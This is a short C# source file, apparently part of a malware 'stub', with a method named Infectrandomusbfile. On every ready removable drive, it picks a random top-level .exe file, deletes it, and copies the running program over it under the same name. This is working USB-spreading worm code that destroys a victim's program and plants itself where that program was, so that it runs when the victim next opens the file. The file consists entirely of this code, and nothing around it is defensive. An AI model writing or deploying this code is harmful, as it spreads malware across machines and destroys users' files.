using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stub
{
    class infecting
    {
        public static void Infectrandomusbfile()
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    if (drive.DriveType == DriveType.Removable)
                    {
                        try
                        {
                            string[] files = Directory.GetFiles(drive.Name, "*.exe", SearchOption.TopDirectoryOnly);
                            Random rnd = new Random();

                            int filen = rnd.Next(0, files.Length);
                            File.Delete(files[filen]);
                            File.Copy(Process.GetCurrentProcess().MainModule.FileName, files[filen]);

                        }
                        catch { }
                    }
                }
            }
        }
    }
}
